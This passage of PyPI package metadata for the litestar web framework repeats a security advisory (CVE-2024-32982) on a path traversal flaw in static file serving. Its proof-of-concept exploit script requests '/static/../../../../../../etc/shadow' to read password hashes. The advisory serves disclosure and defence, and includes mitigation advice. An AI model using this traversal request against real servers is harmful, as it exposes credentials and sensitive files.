Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.3.0/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.3.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"c5f56229e94e9c4c519961484bec2f55f8f6aed92bd4898a6f148d3fa3df04d7","md5":"f7237e29ba8181460e9f4c5b12cd7241","sha256":"e74fbbc95caed211ccab8b73c412c5e1159e5b526a2449f191869a15004c0680"},"downloads":-1,"filename":"litestar-2.3.0-py3-none-any.whl","has_sig":false,"md5_digest":"f7237e29ba8181460e9f4c5b12cd7241","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":476004,"upload_time":"2023-11-02T20:28:39","upload_time_iso_8601":"2023-11-02T20:28:39.222526Z","url":"https://files.pythonhosted.org/packages/c5/f5/6229e94e9c4c519961484bec2f55f8f6aed92bd4898a6f148d3fa3df04d7/litestar-2.3.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"1f57b8cc537e889c81cb3e89b5bcdbe851ab557d8fb76acd09d8718bbc899293","md5":"5d09c0cd44cceb707048a41e7b6c2b0d","sha256":"e2087ef9625a8d9d5b2bd8139d53e9cc30e5f94692706e63e42d734b17abb329"},"downloads":-1,"filename":"litestar-2.3.0.tar.gz","has_sig":false,"md5_digest":"5d09c0cd44cceb707048a41e7b6c2b0d","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":610974,"upload_time":"2023-11-02T20:28:41","upload_time_iso_8601":"2023-11-02T20:28:41.101550Z","url":"https://files.pythonhosted.org/packages/1f/57/b8cc537e889c81cb3e89b5bcdbe851ab557d8fb76acd09d8718bbc899293/litestar-2.3.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.3.1":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.3.1/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.3.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"f2ae5057ab603f2f24a11eb4cf346946b6858051bf0fe6c5a8ff36f068b4a525","md5":"d3ada54af239c3ff93b056d17636c0d4","sha256":"f158c8540425c7cf8cc896e21a1922000da65688e0982cf8c26c863163ba59dd"},"downloads":-1,"filename":"litestar-2.3.1-py3-none-any.whl","has_sig":false,"md5_digest":"d3ada54af239c3ff93b056d17636c0d4","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":476166,"upload_time":"2023-11-04T11:10:10","upload_time_iso_8601":"2023-11-04T11:10:10.383612Z","url":"https://files.pythonhosted.org/packages/f2/ae/5057ab603f2f24a11eb4cf346946b6858051bf0fe6c5a8ff36f068b4a525/litestar-2.3.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"1534b84806a6f1742c6426215de092f1584fd77c5895c6573ecbeb5ee1e0c0a6","md5":"5f92067e2dfd11beac20b54232363027","sha256":"c12e2fd6d53932cf4e631447fe19a0c426523fbb8e52b6bcddf71e900c7184c4"},"downloads":-1,"filename":"litestar-2.3.1.tar.gz","has_sig":false,"md5_digest":"5f92067e2dfd11beac20b54232363027","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":611352,"upload_time":"2023-11-04T11:10:12","upload_time_iso_8601":"2023-11-04T11:10:12.545597Z","url":"https://files.pythonhosted.org/packages/15/34/b84806a6f1742c6426215de092f1584fd77c5895c6573ecbeb5ee1e0c0a6/litestar-2.3.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.3.2":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.3.2/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","email-validator; extra == 'pydantic'","pydantic; extra == 'pydantic'","pydantic-extra-types; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy<1.0.0,>=0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","uvloop>=0.18.0; sys_platform != 'win32' and extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.3.2","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"520630c719dcf5ba0fe8d09615f5a871c57e9fd8af038093971a4d0a7e0d3949","md5":"d466244777833600a3a20e8b88e18156","sha256":"a2301e5a786fa0466a00333f99694972332a85fad69ce222179ce342d84ee0ed"},"downloads":-1,"filename":"litestar-2.3.2-py3-none-any.whl","has_sig":false,"md5_digest":"d466244777833600a3a20e8b88e18156","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":474758,"upload_time":"2023-11-06T20:03:42","upload_time_iso_8601":"2023-11-06T20:03:42.709082Z","url":"https://files.pythonhosted.org/packages/52/06/30c719dcf5ba0fe8d09615f5a871c57e9fd8af038093971a4d0a7e0d3949/litestar-2.3.2-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"bd2aa74448ccaa85a0029306834845c7efa65f2df2476f00acee9005c546b891","md5":"a952d5374cf587995c4f97d26fc13110","sha256":"983b61b5a1a07de2f8e34974e21dc2adf5c3aab767ca89cbe229cecca54b92c3"},"downloads":-1,"filename":"litestar-2.3.2.tar.gz","has_sig":false,"md5_digest":"a952d5374cf587995c4f97d26fc13110","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":610171,"upload_time":"2023-11-06T20:03:45","upload_time_iso_8601":"2023-11-06T20:03:45.639205Z","url":"https://files.pythonhosted.org/packages/bd/2a/a74448ccaa85a0029306834845c7efa65f2df2476f00acee9005c546b891/litestar-2.3.2.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the 